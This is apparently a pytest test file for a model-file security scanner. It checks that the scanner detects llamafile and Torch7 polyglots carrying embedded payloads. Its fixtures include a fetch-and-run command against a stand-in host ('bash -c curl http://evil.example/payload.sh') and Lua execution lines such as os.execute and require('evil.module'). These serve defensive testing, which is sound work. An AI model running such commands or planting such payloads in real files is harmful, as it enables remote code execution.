from __future__ import annotations

import hashlib
import struct
from pathlib import Path
from typing import Any

import pytest

from modelaudit.cache import get_cache_manager, reset_cache_manager
from modelaudit.core import determine_exit_code, scan_model_directory_or_file
from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity, ScanResult
from modelaudit.scanners.llamafile_scanner import (
    LLAMAFILE_PAYLOAD_SCAN_LIMIT_REASON,
    LLAMAFILE_ROUTE_SCAN_BYTES,
    LLAMAFILE_ROUTE_TAIL_SCAN_BYTES,
    LLAMAFILE_RUNTIME_PREVIEW_READ_REASON,
    LlamafileScanner,
    find_structural_torch7_offset,
)


def _build_llamafile_blob(
    *,
    runtime_lines: list[str] | None = None,
    include_marker: bool = True,
    embedded_payload: bytes | None = None,
) -> bytes:
    header = b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56
    marker = b"llamafile runtime\n" if include_marker else b"generic runtime\n"
    runtime = ("\n".join(runtime_lines or ["--threads 4", "--ctx-size 2048"])).encode("utf-8")
    payload = (
        embedded_payload if embedded_payload is not None else b"\x00" * 8192 + b"GGUF" + struct.pack("<IQQ", 3, 0, 0)
    )
    return header + marker + runtime + b"\x00" * 256 + payload


def test_llamafile_scanner_can_handle_detected_llamafile(tmp_path: Path) -> None:
    binary = tmp_path / "model.llamafile"
    binary.write_bytes(_build_llamafile_blob())

    assert LlamafileScanner.can_handle(str(binary))


def test_llamafile_scanner_can_handle_detected_llamafile_with_misleading_suffix(tmp_path: Path) -> None:
    binary = tmp_path / "payload.jpg"
    binary.write_bytes(_build_llamafile_blob())

    assert LlamafileScanner.can_handle(str(binary))


def test_llamafile_scanner_does_not_misclassify_generic_executable(tmp_path: Path) -> None:
    generic_exe = tmp_path / "tool.exe"
    generic_exe.write_bytes(b"MZ" + b"\x00" * 512 + b"normal executable")

    assert not LlamafileScanner.can_handle(str(generic_exe))


def test_llamafile_scanner_can_handle_middle_only_marker_in_exe(tmp_path: Path) -> None:
    binary = tmp_path / "middle-marker.exe"
    binary.write_bytes(
        b"MZ" + b"\x00" * 62 + b"A" * (2 * 1024 * 1024 + 64) + b"llamafile runtime" + b"B" * (2 * 1024 * 1024 + 64)
    )

    assert LlamafileScanner.can_handle(str(binary))


def test_llamafile_scanner_can_handle_casefolded_middle_marker_in_exe(tmp_path: Path) -> None:
    binary = tmp_path / "middle-marker-uppercase.exe"
    binary.write_bytes(
        b"MZ" + b"\x00" * 62 + b"A" * (2 * 1024 * 1024 + 64) + b"LLAMAFILE runtime" + b"B" * (2 * 1024 * 1024 + 64)
    )

    assert LlamafileScanner.can_handle(str(binary))


def test_llamafile_scanner_can_handle_malicious_middle_marker_in_exe(tmp_path: Path) -> None:
    binary = tmp_path / "middle-marker-malicious.exe"
    payload = _build_llamafile_blob(
        runtime_lines=["bash -c curl http://evil.example/payload.sh"],
        include_marker=False,
    )
    binary.write_bytes(
        b"MZ"
        + b"\x00" * 62
        + b"A" * (2 * 1024 * 1024 + 64)
        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
        + payload
    )

    result = LlamafileScanner().scan(str(binary))

    assert LlamafileScanner.can_handle(str(binary))
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


def test_llamafile_scanner_flags_true_middle_runtime_strings(tmp_path: Path) -> None:
    binary = tmp_path / "middle-runtime.llamafile"
    binary.write_bytes(
        b"\x7fELF"
        + b"\x02\x01\x01\x00"
        + b"\x00" * 56
        + b"A" * (2 * 1024 * 1024)
        + b"bash -c curl http://evil.example/payload.sh"
        + b"B" * (1024 * 1024 - 512)
        + b"llamafile runtime\n"
        + b"B" * (2 * 1024 * 1024 + 64)
    )

    result = LlamafileScanner().scan(str(binary))

    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


def test_llamafile_scanner_does_not_route_middle_near_match_in_exe(tmp_path: Path) -> None:
    binary = tmp_path / "middle-near-match.exe"
    binary.write_bytes(
        b"MZ" + b"\x00" * 62 + b"A" * (2 * 1024 * 1024 + 64) + b"llama-file runtime" + b"B" * (2 * 1024 * 1024 + 64)
    )

    assert not LlamafileScanner.can_handle(str(binary))


def test_llamafile_scanner_can_handle_does_not_scan_past_route_budget(tmp_path: Path) -> None:
    binary = tmp_path / "late-marker.exe"
    binary.write_bytes(
        b"MZ"
        + b"\x00" * 62
        + b"A" * LLAMAFILE_ROUTE_SCAN_BYTES
        + b"llamafile runtime"
        + b"B" * LLAMAFILE_ROUTE_TAIL_SCAN_BYTES
    )

    assert not LlamafileScanner.can_handle(str(binary))


def test_llamafile_scanner_can_handle_tail_only_marker_in_exe(tmp_path: Path) -> None:
    binary = tmp_path / "tail-marker.exe"
    binary.write_bytes(b"MZ" + b"\x00" * 62 + b"A" * (LLAMAFILE_ROUTE_SCAN_BYTES + 64) + b"llamafile runtime")

    assert LlamafileScanner.can_handle(str(binary))


def test_llamafile_scanner_benign_sample_has_no_high_severity(tmp_path: Path) -> None:
    binary = tmp_path / "safe.llamafile"
    binary.write_bytes(_build_llamafile_blob())

    result = LlamafileScanner().scan(str(binary))

    high_severity = [
        issue for issue in result.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
    ]
    assert high_severity == []
    assert result.metadata.get("embedded_payload_offset") is not None


def test_llamafile_torch7_polyglot_preserves_outer_integrity_metadata(tmp_path: Path) -> None:
    binary = tmp_path / "embedded-torch7.llamafile"
    binary.write_bytes(
        _build_llamafile_blob(
            embedded_payload=b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('id')\n",
        )
    )
    expected_size = binary.stat().st_size
    expected_sha256 = hashlib.sha256(binary.read_bytes()).hexdigest()

    result = LlamafileScanner().scan(str(binary))

    assert result.metadata["file_size"] == expected_size
    assert result.metadata["file_hashes"]["sha256"] == expected_sha256


def test_llamafile_detects_appended_torch7_after_valid_gguf_payload(tmp_path: Path) -> None:
    binary = tmp_path / "valid-gguf-then-torch7.llamafile"
    valid_gguf = b"GGUF" + struct.pack("<IQQ", 3, 0, 0)
    torch7_payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('id')\n"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=valid_gguf + (b"\x00" * 1024) + torch7_payload))

    result = LlamafileScanner().scan(str(binary))

    assert result.metadata["embedded_payload_offset"] < result.metadata["embedded_torch7_offset"]
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.WARNING
        for check in result.checks
    )


def test_llamafile_skips_bare_torch7_decoy_before_appended_payload(tmp_path: Path) -> None:
    binary = tmp_path / "torch7-decoy-then-payload.llamafile"
    valid_gguf = b"GGUF" + struct.pack("<IQQ", 3, 0, 0)
    torch7_payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('id')\n"
    embedded_payload = valid_gguf + b"T7\x00\x00" + (b"A" * 8192) + torch7_payload
    binary.write_bytes(_build_llamafile_blob(embedded_payload=embedded_payload))

    result = LlamafileScanner(config={"torch7_max_scan_bytes": 128}).scan(str(binary))

    assert result.metadata["embedded_torch7_offset"] == binary.read_bytes().index(torch7_payload)
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.WARNING
        for check in result.checks
    )


def test_llamafile_bounds_torch7_scan_attempts_after_marker_decoys(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    binary = tmp_path / "many-torch7-marker-decoys.llamafile"
    valid_gguf = b"GGUF" + struct.pack("<IQQ", 3, 0, 0)
    decoys = b"".join(b"T7\x00\x00" + (b"A" * 32) for _ in range(256))
    torch7_payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('id')\n"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=valid_gguf + decoys + torch7_payload))

    scanned_offsets: list[int] = []
    original_scan_candidate = LlamafileScanner._scan_embedded_torch7_candidate

    def counting_scan_candidate(
        self: LlamafileScanner,
        path: Path,
        scanner: Any,
        result: ScanResult,
        offset: int,
    ) -> tuple[ScanResult | None, int]:
        scanned_offsets.append(offset)
        return original_scan_candidate(self, path, scanner, result, offset)

    monkeypatch.setattr(LlamafileScanner, "_scan_embedded_torch7_candidate", counting_scan_candidate)

    result = LlamafileScanner(config={"torch7_max_scan_bytes": 128}).scan(str(binary))

    assert scanned_offsets == [binary.read_bytes().index(torch7_payload)]
    assert result.metadata["embedded_torch7_offset"] == scanned_offsets[0]
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.WARNING
        for check in result.checks
    )


def test_llamafile_finds_torch7_in_initial_payload_pass_while_skipping_marker_decoys(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    binary = tmp_path / "many-torch7-marker-decoys-single-pass.llamafile"
    valid_gguf = b"GGUF" + struct.pack("<IQQ", 3, 0, 0)
    decoys = b"".join(b"T7\x00\x00" + (b"A" * 32) for _ in range(128))
    torch7_payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('id')\n"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=valid_gguf + decoys + torch7_payload))

    find_start_offsets: list[int] = []
    original_find_offset = LlamafileScanner._find_embedded_torch7_offset

    def counting_find_offset(path: Path, max_scan_bytes: int, *, start_offset: int = 0) -> int | None:
        find_start_offsets.append(start_offset)
        return original_find_offset(path, max_scan_bytes, start_offset=start_offset)

    monkeypatch.setattr(LlamafileScanner, "_find_embedded_torch7_offset", staticmethod(counting_find_offset))

    signal_probe_offsets: list[int] = []
    original_signal_rank = LlamafileScanner._embedded_torch7_candidate_actionable_signal_rank

    def counting_signal_rank(path: Path, offset: int, max_scan_bytes: int, *, stop_at_any_marker: bool = False) -> int:
        signal_probe_offsets.append(offset)
        return original_signal_rank(path, offset, max_scan_bytes, stop_at_any_marker=stop_at_any_marker)

    monkeypatch.setattr(
        LlamafileScanner,
        "_embedded_torch7_candidate_actionable_signal_rank",
        classmethod(
            lambda cls, path, offset, max_scan_bytes, *, stop_at_any_marker=False: counting_signal_rank(
                path,
                offset,
                max_scan_bytes,
                stop_at_any_marker=stop_at_any_marker,
            )
        ),
    )

    result = LlamafileScanner(config={"torch7_max_scan_bytes": 128}).scan(str(binary))

    assert find_start_offsets == []
    assert result.metadata["embedded_torch7_offset"] == binary.read_bytes().index(torch7_payload)
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.WARNING
        for check in result.checks
    )


def test_llamafile_continues_after_structural_torch7_decoy(tmp_path: Path) -> None:
    binary = tmp_path / "torch7-structural-decoy-then-payload.llamafile"
    valid_gguf = b"GGUF" + struct.pack("<IQQ", 3, 0, 0)
    structural_decoy = b"T7\x00\x00torch.FloatTensor tensor placeholder\n"
    torch7_payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('id')\n"
    embedded_payload = valid_gguf + structural_decoy + (b"A" * 8192) + torch7_payload
    binary.write_bytes(_build_llamafile_blob(embedded_payload=embedded_payload))

    result = LlamafileScanner(config={"torch7_max_scan_bytes": 128}).scan(str(binary))

    assert result.metadata["embedded_torch7_offset"] == binary.read_bytes().index(torch7_payload)
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.WARNING
        for check in result.checks
    )


def test_llamafile_preserves_later_same_severity_distinct_torch7_findings(tmp_path: Path) -> None:
    binary = tmp_path / "torch7-two-warning-candidates.llamafile"
    dynamic_load_payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\npackage.loadlib('libx.so', 'luaopen_x')\n"
    exec_payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('id')\n"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=dynamic_load_payload + (b"A" * 8192) + exec_payload))

    result = LlamafileScanner(config={"torch7_max_scan_bytes": 128}).scan(str(binary))

    failed_warning_checks = {
        check.name
        for check in result.checks
        if check.status == CheckStatus.FAILED and check.severity == IssueSeverity.WARNING
    }
    assert "Torch7 Dynamic Module Load Analysis" in failed_warning_checks
    assert "Torch7 Lua Execution Primitive Analysis" in failed_warning_checks
    assert [candidate["offset"] for candidate in result.metadata["embedded_torch7_candidates"]] == [
        binary.read_bytes().index(dynamic_load_payload),
        binary.read_bytes().index(exec_payload),
    ]


def test_llamafile_preserves_same_signal_torch7_candidates_with_distinct_evidence(tmp_path: Path) -> None:
    binary = tmp_path / "torch7-two-exec-candidates.llamafile"
    first_exec_payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('id')\n"
    second_exec_payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('whoami')\n"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=first_exec_payload + (b"A" * 8192) + second_exec_payload))

    result = LlamafileScanner(config={"torch7_max_scan_bytes": 128}).scan(str(binary))

    assert [candidate["offset"] for candidate in result.metadata["embedded_torch7_candidates"]] == [
        binary.read_bytes().index(first_exec_payload),
        binary.read_bytes().index(second_exec_payload),
    ]
    failed_examples = [
        example
        for check in result.checks
        if check.name == "Torch7 Lua Execution Primitive Analysis" and check.status == CheckStatus.FAILED
        for example in check.details["examples"]
    ]
    assert any("os.execute('id')" in example for example in failed_examples)
    assert any("os.execute('whoami')" in example for example in failed_examples)


def test_llamafile_prefers_later_critical_torch7_candidate_over_warning_decoy(tmp_path: Path) -> None:
    binary = tmp_path / "torch7-warning-decoy-then-critical.llamafile"
    warning_decoy = b"T7\x00\x00torch.FloatTensor nn.Sequential\npackage.loadlib('libx.so', 'luaopen_x')\n"
    critical_payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('bash -c id')\n"
    embedded_payload = warning_decoy + (b"A" * 8192) + critical_payload
    binary.write_bytes(_build_llamafile_blob(embedded_payload=embedded_payload))

    result = LlamafileScanner(config={"torch7_max_scan_bytes": 128}).scan(str(binary))

    assert result.metadata["embedded_torch7_offset"] == binary.read_bytes().index(critical_payload)
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )


def test_llamafile_bounds_actionable_candidate_scans_but_keeps_higher_severity(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    binary = tmp_path / "torch7-many-actionable-decoys-then-critical.llamafile"
    warning_candidates = [
        f"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('id-{index}')\n".encode() + (b"A" * 256)
        for index in range(8)
    ]
    critical_payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('bash -c id')\n"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=b"".join(warning_candidates) + critical_payload))

    scanned_offsets: list[int] = []
    original_scan_candidate = LlamafileScanner._scan_embedded_torch7_candidate

    def counting_scan_candidate(
        self: LlamafileScanner,
        path: Path,
        scanner: Any,
        result: ScanResult,
        offset: int,
    ) -> tuple[ScanResult | None, int]:
        scanned_offsets.append(offset)
        return original_scan_candidate(self, path, scanner, result, offset)

    monkeypatch.setattr(LlamafileScanner, "_scan_embedded_torch7_candidate", counting_scan_candidate)

    result = LlamafileScanner(config={"llamafile_torch7_max_candidate_scans": 2, "torch7_max_scan_bytes": 128}).scan(
        str(binary)
    )

    critical_offset = binary.read_bytes().index(critical_payload)
    assert scanned_offsets == [
        binary.read_bytes().index(warning_candidates[0]),
        binary.read_bytes().index(warning_candidates[1]),
        critical_offset,
    ]
    assert result.metadata["embedded_torch7_candidate_scan_limited"] is True
    assert result.metadata["embedded_torch7_actionable_candidate_scans"] == 3
    assert result.metadata["embedded_torch7_offset"] == critical_offset
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )


def test_llamafile_ranks_split_critical_signal_before_actionable_cap(tmp_path: Path) -> None:
    binary = tmp_path / "torch7-split-critical-signal-after-warning-cap.llamafile"
    warning_candidates = [
        f"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('id-{index}')\n".encode() + (b"A" * (130 * 1024))
        for index in range(4)
    ]
    critical_prefix = b"T7\x00\x00torch.FloatTensor nn.Sequential\n"
    shell_signal = b"\x00bash -c\n"
    first_chunk_padding = b"A" * (64 * 1024 - len(critical_prefix) - len(shell_signal) - 256)
    critical_payload = (
        critical_prefix + first_chunk_padding + shell_signal + (b"\x00" * 256) + b"cmd = os.execute('id')\n"
    )
    binary.write_bytes(_build_llamafile_blob(embedded_payload=b"".join(warning_candidates) + critical_payload))

    result = LlamafileScanner(
        config={"llamafile_torch7_max_candidate_scans": 2, "torch7_max_scan_bytes": 128 * 1024}
    ).scan(str(binary))

    assert result.metadata["embedded_torch7_offset"] == binary.read_bytes().index(critical_payload)
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )


def test_llamafile_does_not_rank_unrelated_shell_string_as_critical_cap_signal(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    binary = tmp_path / "torch7-unrelated-shell-decoys-then-critical.llamafile"
    warning_candidates = [
        (
            f"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('id-{index}')\n".encode()
            + b"\x00".join(f"benign-{filler}".encode() for filler in range(8))
            + b"\x00bash -c\n"
            + b"\x00"
            + (b"P" * 512)
        )
        for index in range(4)
    ]
    critical_payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('bash -c id')\n"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=b"".join(warning_candidates) + critical_payload))

    scanned_offsets: list[int] = []
    original_scan_candidate = LlamafileScanner._scan_embedded_torch7_candidate

    def counting_scan_candidate(
        self: LlamafileScanner,
        path: Path,
        scanner: Any,
        result: ScanResult,
        offset: int,
    ) -> tuple[ScanResult | None, int]:
        scanned_offsets.append(offset)
        return original_scan_candidate(self, path, scanner, result, offset)

    monkeypatch.setattr(LlamafileScanner, "_scan_embedded_torch7_candidate", counting_scan_candidate)

    result = LlamafileScanner(config={"llamafile_torch7_max_candidate_scans": 2, "torch7_max_scan_bytes": 512}).scan(
        str(binary)
    )

    critical_offset = binary.read_bytes().index(critical_payload)
    assert scanned_offsets == [
        binary.read_bytes().index(warning_candidates[0]),
        binary.read_bytes().index(warning_candidates[1]),
        critical_offset,
    ]
    assert result.metadata["embedded_torch7_offset"] == critical_offset
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )


def test_llamafile_keeps_searching_after_non_actionable_candidate_cap(tmp_path: Path) -> None:
    binary = tmp_path / "torch7-many-benign-candidates-then-payload.llamafile"
    benign_candidates = b"".join(b"T7\x00\x00" + (b"A" * 64) for _ in range(32))
    torch7_payload = b"T7\x00\x00" + (b"A" * (80 * 1024)) + b"cmd = os.execute('id')\n"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=benign_candidates + torch7_payload))

    result = LlamafileScanner(
        config={"llamafile_torch7_max_candidate_scans": 4, "torch7_max_scan_bytes": 128 * 1024}
    ).scan(str(binary))

    assert result.metadata["embedded_torch7_offset"] == binary.read_bytes().index(torch7_payload)
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.WARNING
        for check in result.checks
    )


def test_llamafile_binary_torch7_internal_marker_survives_non_actionable_cap(tmp_path: Path) -> None:
    binary = tmp_path / "torch7-internal-marker-after-binary-decoys.llamafile"
    binary_decoys = [b"T7\x00\x00\x01\x02\x03\x04benign serialized bytes\n" + (b"A" * 8192) for _ in range(4)]
    torch7_payload = b"T7\x00\x00\x01\x02\x03\x04T7\x00\x00serialized record bytes\ncmd = os.execute('id')\n"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=b"".join(binary_decoys) + torch7_payload))

    result = LlamafileScanner(config={"llamafile_torch7_max_candidate_scans": 2, "torch7_max_scan_bytes": 4096}).scan(
        str(binary)
    )

    assert result.metadata["embedded_torch7_offset"] == binary.read_bytes().index(torch7_payload)
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.WARNING
        for check in result.checks
    )


def test_llamafile_keeps_searching_after_cap_for_require_only_torch7_payload(tmp_path: Path) -> None:
    binary = tmp_path / "torch7-many-benign-candidates-then-require-payload.llamafile"
    benign_candidates = b"".join(b"T7\x00\x00torch.FloatTensor tensor placeholder\n" for _ in range(8))
    torch7_payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\nrequire('evil.module')\n"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=benign_candidates + torch7_payload))

    result = LlamafileScanner(config={"llamafile_torch7_max_candidate_scans": 4, "torch7_max_scan_bytes": 128}).scan(
        str(binary)
    )

    assert result.metadata["embedded_torch7_offset"] == binary.read_bytes().index(torch7_payload)
    assert any(
        check.name == "Torch7 Dynamic Module Load Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.WARNING
        for check in result.checks
    )


def test_llamafile_safe_require_decoys_do_not_exhaust_actionable_candidate_budget(tmp_path: Path) -> None:
    binary = tmp_path / "torch7-safe-require-decoys-then-evil-require.llamafile"
    safe_decoys = [b"T7\x00\x00\x01\x02\x03\x04require('torch')\n" + (b"A" * 256) for _ in range(4)]
    torch7_payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\nrequire('evil.module')\n"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=b"".join(safe_decoys) + torch7_payload))

    result = LlamafileScanner(config={"llamafile_torch7_max_candidate_scans": 2, "torch7_max_scan_bytes": 128}).scan(
        str(binary)
    )

    assert result.metadata["embedded_torch7_offset"] == binary.read_bytes().index(torch7_payload)
    assert any(
        check.name == "Torch7 Dynamic Module Load Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.WARNING
        for check in result.checks
    )


def test_llamafile_torch7_iterator_skips_marker_decoy_before_actionable_candidate(tmp_path: Path) -> None:
    binary = tmp_path / "torch7-signal-after-next-marker.llamafile"
    first_candidate = b"T7\x00\x00" + (b"A" * 64)
    second_candidate = b"T7\x00\x00" + (b"A" * (80 * 1024)) + b"cmd = os.execute('id')\n"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=first_candidate + second_candidate))

    first_offset = binary.read_bytes().index(first_candidate)
    second_offset = binary.read_bytes().index(second_candidate)

    assert list(LlamafileScanner._iter_embedded_torch7_offsets(binary, 128 * 1024, start_offset=first_offset)) == [
        second_offset
    ]


def test_llamafile_ignores_benign_torch7_magic_only_marker(tmp_path: Path) -> None:
    binary = tmp_path / "benign-torch7-marker-only.llamafile"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=b"T7\x00\x00" + (b"A" * 8192)))

    result = LlamafileScanner().scan(str(binary))

    assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
    assert "embedded_torch7_offset" not in result.metadata
    assert not any(check.name.startswith("Torch7 ") for check in result.checks)


def test_llamafile_ignores_benign_binary_torch7_magic_only_marker(tmp_path: Path) -> None:
    binary = tmp_path / "benign-binary-torch7-marker-only.llamafile"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=b"T7\x00\x00" + (b"\x00\x01\x02\x03" * 8192)))

    result = LlamafileScanner(config={"torch7_max_scan_bytes": 128}).scan(str(binary))

    assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
    assert "embedded_torch7_offset" not in result.metadata
    assert not any(check.name.startswith("Torch7 ") for check in result.checks)


def test_llamafile_preserves_magic_only_binary_torch7_payload(tmp_path: Path) -> None:
    binary = tmp_path / "magic-only-binary-torch7.llamafile"
    torch7_payload = b"T7\x00\x00" + (b"\x01\x02\x03\x04" * 1024) + b"cmd = os.execute('id')\n"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=torch7_payload))

    result = LlamafileScanner().scan(str(binary))

    assert result.metadata["embedded_torch7_offset"] == binary.read_bytes().index(torch7_payload)
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.WARNING
        for check in result.checks
    )


def test_llamafile_preserves_magic_only_binary_torch7_payload_with_late_lua_signal(tmp_path: Path) -> None:
    binary = tmp_path / "late-magic-only-binary-torch7.llamafile"
    binary_records = b"\x01\x02\x03\x04" * (20 * 1024)
    torch7_payload = b"T7\x00\x00" + binary_records + b"cmd = os.execute('id')\n"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=torch7_payload))

    result = LlamafileScanner().scan(str(binary))

    assert result.metadata["embedded_torch7_offset"] == binary.read_bytes().index(torch7_payload)
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.WARNING
        for check in result.checks
    )


def test_llamafile_preserves_printable_magic_only_torch7_payload_with_late_lua_signal(tmp_path: Path) -> None:
    binary = tmp_path / "late-printable-magic-only-torch7.llamafile"
    torch7_payload = b"T7\x00\x00" + (b"A" * (2 * 1024 * 1024)) + b"cmd = os.execute('id')\n"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=torch7_payload))

    result = LlamafileScanner().scan(str(binary))

    assert result.metadata["embedded_torch7_offset"] == binary.read_bytes().index(torch7_payload)
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.WARNING
        for check in result.checks
    )


def test_llamafile_detects_torch7_header_cut_by_embedded_gguf_marker(tmp_path: Path) -> None:
    binary = tmp_path / "torch7-header-with-embedded-gguf-marker.llamafile"
    torch7_payload = b"T7\x00\x00GGUFserialized bytes\ncmd = os.execute('id')\n"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=torch7_payload))

    result = LlamafileScanner(config={"torch7_max_scan_bytes": 4096}).scan(str(binary))

    assert result.metadata["embedded_torch7_offset"] == binary.read_bytes().index(torch7_payload)
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.WARNING
        for check in result.checks
    )


def test_llamafile_ignores_many_invalid_ascii_torch7_header_decoys(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    binary = tmp_path / "many-ascii-torch7-decoys.llamafile"
    invalid_ascii_decoys = b"".join(b"4\nnot-an-index\n" for _ in range(4096))
    torch7_payload = b"4\n1\n3\nV 1\n13\nnn.Sequential\ncmd = os.execute('id')\n"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=invalid_ascii_decoys + torch7_payload))

    scanned_offsets: list[int] = []
    structural_probes = 0
    original_scan_candidate = LlamafileScanner._scan_embedded_torch7_candidate
    original_structural_probe = find_structural_torch7_offset

    def counting_scan_candidate(
        self: LlamafileScanner,
        path: Path,
        scanner: Any,
        result: ScanResult,
        offset: int,
    ) -> tuple[ScanResult | None, int]:
        scanned_offsets.append(offset)
        return original_scan_candidate(self, path, scanner, result, offset)

    def counting_structural_probe(payload: bytes) -> int | None:
        nonlocal structural_probes
        structural_probes += 1
        return original_structural_probe(payload)

    monkeypatch.setattr(LlamafileScanner, "_scan_embedded_torch7_candidate", counting_scan_candidate)
    monkeypatch.setattr(
        "modelaudit.scanners.llamafile_scanner.find_structural_torch7_offset", counting_structural_probe
    )

    result = LlamafileScanner(config={"torch7_max_scan_bytes": 256}).scan(str(binary))

    assert scanned_offsets == [binary.read_bytes().index(torch7_payload)]
    assert structural_probes <= 4
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.WARNING
        for check in result.checks
    )


def test_llamafile_ignores_truncated_embedded_torch7_marker(tmp_path: Path) -> None:
    binary = tmp_path / "truncated-torch7-marker.llamafile"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=b"T7\x00\x00"))

    result = LlamafileScanner().scan(str(binary))

    assert result.success is True
    assert "embedded_torch7_offset" not in result.metadata
    assert not any(check.name.startswith("Torch7 ") for check in result.checks)


def test_llamafile_runtime_preview_read_failure_is_inconclusive_not_security_finding(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    binary = tmp_path / "unavailable-preview.llamafile"
    binary.write_bytes(_build_llamafile_blob())

    def raise_os_error(_path: Path, _num_bytes: int) -> bytes:
        raise OSError("simulated runtime preview read failure")

    monkeypatch.setattr(LlamafileScanner, "_read_prefix", staticmethod(raise_os_error))

    direct = LlamafileScanner().scan(str(binary))

    assert direct.success is False
    assert direct.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
    assert LLAMAFILE_RUNTIME_PREVIEW_READ_REASON in direct.metadata.get("scan_outcome_reasons", [])
    read_checks = [check for check in direct.checks if check.name == "Llamafile Runtime Preview Read"]
    assert len(read_checks) == 1
    assert read_checks[0].severity == IssueSeverity.INFO
    assert read_checks[0].message == "Failed reading runtime preview bytes: simulated runtime preview read failure"
    assert read_checks[0].details.get("analysis_incomplete") is True
    assert read_checks[0].details.get("scan_outcome_reason") == LLAMAFILE_RUNTIME_PREVIEW_READ_REASON

    aggregate = scan_model_directory_or_file(str(binary), cache_scan_results=False)
    high_severity = [
